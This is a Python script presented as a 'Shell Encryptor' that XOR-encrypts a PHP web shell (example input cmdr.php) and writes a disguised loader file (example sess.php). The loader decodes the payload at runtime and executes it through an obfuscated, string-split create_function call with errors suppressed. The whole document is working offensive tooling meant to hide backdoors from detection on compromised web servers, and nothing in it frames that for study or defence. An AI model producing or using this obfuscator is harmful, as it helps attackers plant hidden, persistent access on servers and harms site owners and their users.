import os
import sys
import signal

def signal_handler(sig, frame):
    print("\n\033[91m[!] Aborted by user. Exiting...\033[0m")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

G = '\033[92m' # Green
Y = '\033[93m' # Yellow
R = '\033[91m' # Red
B = '\033[94m' # Blue
C = '\033[96m' # Cyan
W = '\033[0m'  # White

def run():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{C}="*50)
    print(f"{C}   L4663r666h05t - Shell Encryptor {W}({Y}Umbra.by{W})")
    print(f"{C}="*50 + f"{W}")

    try:
        f_in = input(f"{W}[{G}?{W}] Source file (e.g. cmdr.php): ")
        if not os.path.exists(f_in):
            print(f"{R}[!] Error: File not found!{W}")
            return

        f_out = input(f"{W}[{G}?{W}] Output name (e.g. sess.php): ")
        key = input(f"{W}[{G}?{W}] Custom Key: ")

        with open(f_in, 'r') as f:
            raw = f.read()

        if raw.strip().startswith('<?php'):
            raw = raw.replace('<?php', '', 1).strip()

        payload = "?>" + raw
        enc = "".join([format(ord(payload[i]) ^ ord(key[i % len(key)]), '02x') for i in range(len(payload))])

        loader = f"""<?php
/* Author: L4663r666h05t | https://umbra.by/L4663r666h05t */
$k="{key}";$p="{enc}";$d="";
for($i=0;$i<strlen($p);$i+=2){{$d.=chr(hexdec($p[$i].$p[$i+1])^ord($k[($i/2)%strlen($k)]));}}
$f="cre"."ate_fun"."ction";$x=@$f('',$d);@$x(); ?>"""

        with open(f_out, 'w') as f:
            f.write(loader)

        print(f"{C}-"*50)
        print(f"{G}[+] STATUS   : SUCCESS")
        print(f"{G}[+] OUTPUT   : {f_out}")
        print(f"{G}[+] SIZE     : {len(enc)} bytes")
        print(f"{C}-"*50 + f"{W}")

    except Exception as e:
        print(f"{R}[!] Error: {str(e)}{W}")

if __name__ == "__main__":
    run()
